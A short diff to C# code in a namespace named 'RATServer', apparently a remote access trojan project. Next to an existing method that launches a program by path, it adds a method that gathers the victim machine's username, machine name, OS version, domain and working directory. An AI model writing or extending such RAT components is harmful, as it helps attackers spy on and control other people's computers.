@@ -16,5 +16,11 @@ namespace RATServer
         {
             System.Diagnostics.Process.Start(Path);
         }
+        public static string PCInfo()
+        {
+            string x;
+            x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
+            return x;
+        }
     }
 }
